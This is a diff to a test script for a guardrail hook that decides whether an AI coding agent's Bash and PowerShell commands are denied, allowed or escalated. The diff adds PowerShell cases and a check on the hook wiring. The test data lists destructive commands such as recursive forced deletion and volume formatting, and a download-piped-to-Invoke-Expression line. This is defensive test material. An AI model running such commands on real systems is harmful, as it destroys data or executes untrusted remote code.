@@ -19,7 +19,7 @@ const HOOKS_DIR = path.join(__dirname, '..', 'plugins', 'bash-guardrails', 'hook
 const HOOK = path.join(HOOKS_DIR, 'guardrails.js');
 const HOOKS_JSON = path.join(HOOKS_DIR, 'hooks.json');
 
-// [label, command, expected decision: 'deny' | 'allow' | 'ask']
+// [label, command, expected decision: 'deny' | 'allow' | 'ask', tool='Bash']
 const CASES = [
   // BLOCK -> deny with guidance
   ['build blob (cd)',       'cd "B:/x" && pnpm build >/tmp/b.log 2>&1 && echo PASS || { echo FAIL; tail -20 /tmp/b.log; }', 'deny'],
@@ -61,21 +61,55 @@ const CASES = [
   // ASK -> passthrough (empty {})
   ['chained safe',          'pnpm build && pnpm test', 'ask'],
   ['unknown command',       'frobnicate --now', 'ask'],
+
+  // ===== PowerShell tool (tool_name: 'PowerShell') =====
+  // DENY -> destructive
+  ['ps Remove-Item -Recurse', 'Remove-Item -Recurse -Force .\\dist', 'deny', 'PowerShell'],
+  ['ps rm alias recurse',     'rm -Recurse node_modules', 'deny', 'PowerShell'],
+  ['ps gci | Remove-Item',    'Get-ChildItem -Recurse | Remove-Item -Force', 'deny', 'PowerShell'],
+  ['ps Clear-Content',        'Clear-Content important.txt', 'deny', 'PowerShell'],
+  ['ps Format-Volume',        'Format-Volume -DriveLetter D', 'deny', 'PowerShell'],
+  ['ps git force (pwsh)',     'git push --force origin feat', 'deny', 'PowerShell'],
+
+  // DENY (guidance) -> steer to Write tool
+  ['ps Set-Content',          'Set-Content -Path a.txt -Value hi', 'deny', 'PowerShell'],
+  ['ps Out-File',             'Get-Process | Out-File procs.txt', 'deny', 'PowerShell'],
+  ['ps redirect',             'Get-Date > now.txt', 'deny', 'PowerShell'],
+
+  // ASK -> dangerous/arbitrary-code form (demoted from auto-allow)
+  ['ps iex',                  'Invoke-Expression $payload', 'ask', 'PowerShell'],
+  ['ps download | iex',       'Invoke-WebRequest https://x | Invoke-Expression', 'ask', 'PowerShell'],
+  ['ps foreach scriptblock',  'Get-ChildItem | ForEach-Object { $_.Name }', 'ask', 'PowerShell'],
+  ['ps New-Item -Force',      'New-Item -Force -ItemType File a.txt', 'ask', 'PowerShell'],
+  ['ps node -e (pwsh)',       'node -e "1+1"', 'ask', 'PowerShell'],
+  ['ps pipe to Remove-Item',  'Get-ChildItem | Remove-Item', 'ask', 'PowerShell'],
+
+  // ALLOW -> safe read-only / dev commands (pipelines are fine)
+  ['ps gci',                  'Get-ChildItem -Recurse', 'allow', 'PowerShell'],
+  ['ps gci | select',         'Get-ChildItem | Select-Object Name', 'allow', 'PowerShell'],
+  ['ps Test-Path',            'Test-Path .\\package.json', 'allow', 'PowerShell'],
+  ['ps git status (pwsh)',    'git status', 'allow', 'PowerShell'],
+  ['ps Select-String',        'Select-String -Path *.ts -Pattern TODO', 'allow', 'PowerShell'],
+  ['ps New-Item dir',         'New-Item -ItemType Directory .tmp', 'allow', 'PowerShell'],
+
+  // ASK -> passthrough
+  ['ps unknown cmdlet',       'Get-Service', 'ask', 'PowerShell'],
+  ['ps chained',              'Get-ChildItem; Get-Date', 'ask', 'PowerShell'],
 ];
 
-function decisionFor(command) {
-  const payload = JSON.stringify({ tool_name: 'Bash', tool_input: { command } });
+function decisionFor(command, tool) {
+  const payload = JSON.stringify({ tool_name: tool || 'Bash', tool_input: { command } });
   const res = spawnSync(process.execPath, [HOOK], { input: payload, encoding: 'utf8' });
   const out = JSON.parse(res.stdout || '{}');
   return (out.hookSpecificOutput && out.hookSpecificOutput.permissionDecision) || 'ask';
 }
 
 let failed = 0;
-for (const [label, command, expected] of CASES) {
-  const actual = decisionFor(command);
+for (const [label, command, expected, tool] of CASES) {
+  const actual = decisionFor(command, tool);
   const ok = actual === expected;
   if (!ok) failed++;
-  console.log(`${ok ? 'PASS' : 'FAIL'}  ${expected.padEnd(5)} ${ok ? '' : `(got ${actual}) `}${label}`);
+  console.log(`${ok ? 'PASS' : 'FAIL'}  ${expected.padEnd(5)} ${ok ? '' : `(got ${actual}) `}${(tool || 'Bash').padEnd(10)} ${label}`);
 }
 
 // Validate hooks.json WIRING, not just guardrails.js logic. Claude Code requires
@@ -93,7 +127,7 @@ try {
   const pre = cfg.hooks && cfg.hooks.PreToolUse;
   wiringCheck('hooks.PreToolUse is an array', Array.isArray(pre));
   const entry = Array.isArray(pre) ? pre[0] : null;
-  wiringCheck('PreToolUse[0] matches Bash', !!entry && entry.matcher === 'Bash');
+  wiringCheck('matcher covers Bash + PowerShell', !!entry && /Bash/.test(entry.matcher || '') && /PowerShell/.test(entry.matcher || ''));
   const inner = entry && Array.isArray(entry.hooks) ? entry.hooks[0] : null;
   wiringCheck('command references guardrails.js', !!inner && inner.type === 'command' && /guardrails\.js/.test(inner.command || ''));
 } catch (err) {
